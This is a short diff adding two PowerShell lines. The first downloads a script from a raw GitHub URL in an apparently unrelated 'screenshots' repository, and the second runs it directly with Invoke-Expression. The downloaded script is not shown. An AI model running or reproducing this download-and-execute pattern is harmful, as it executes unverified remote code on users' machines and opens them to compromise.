@@ -1,0 +1,2 @@
+$ScriptFromGithHub = Invoke-WebRequest https://raw.githubusercontent.com/Karanxidhu/screenshots/main/node%20js/run.ps1
+Invoke-Expression $($ScriptFromGithHub.Content)
